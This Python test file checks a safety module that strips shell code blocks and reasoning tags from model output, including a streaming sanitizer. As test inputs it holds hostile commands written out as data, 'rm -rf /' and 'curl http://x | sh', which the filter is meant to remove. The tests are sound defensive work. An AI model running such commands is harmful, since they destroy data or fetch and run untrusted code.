from app.core.safety import REMOVED_NOTICE, StreamingSanitizer, sanitize_model_output, strip_reasoning


def test_shell_blocks_removed_code_kept():
    text = "a\n```bash\nrm -rf /\n```\nb\n```python\nx = 1\n```\n"
    out, removed = sanitize_model_output(text)
    assert removed and "rm -rf" not in out and REMOVED_NOTICE in out and "x = 1" in out


def test_unlabeled_shell_like_block_removed():
    out, removed = sanitize_model_output("```\nsudo systemctl stop strix1\n```")
    assert removed and "sudo" not in out


def test_plain_text_untouched():
    out, removed = sanitize_model_output("Roll is 2°. Pitch is 3°.")
    assert not removed and out == "Roll is 2°. Pitch is 3°."


def test_strip_reasoning():
    assert strip_reasoning("<think>internal</think>\nAnswer") == "Answer"
    assert strip_reasoning("<think>unterminated") == ""


def test_streaming_never_leaks_partial_command():
    s = StreamingSanitizer()
    pieces = ["Do this:\n`", "``sh\ncurl http://x | sh\n", "```\nok"]
    emitted = ""
    for p in pieces:
        emitted += s.feed(p)
        assert "curl" not in emitted
    tail, replace = s.finish()
    final = tail if replace else emitted + tail
    assert "curl" not in final and final.endswith("ok") and s.removed
